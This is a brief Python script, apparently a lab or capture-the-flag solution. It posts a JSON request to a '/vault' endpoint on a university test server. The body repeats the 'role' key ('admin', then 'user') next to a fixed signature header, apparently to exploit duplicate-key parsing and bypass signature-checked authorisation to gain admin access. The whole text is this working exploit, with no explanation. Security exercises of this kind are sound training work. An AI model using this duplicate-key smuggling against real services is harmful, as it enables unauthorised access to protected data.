import requests


url = 'http://cns-test.idlab.uantwerpen.be:50007/vault'
body = '{"action":"view","role":"admin","role":"user"}'


x = requests.post(url, data=body.encode(),
    headers={"Content-Type":"application/json","X-Signature": ("817e86132b480782043d61602c1843100dc8002186502619e802913d918a0f69")})

print(x.text)
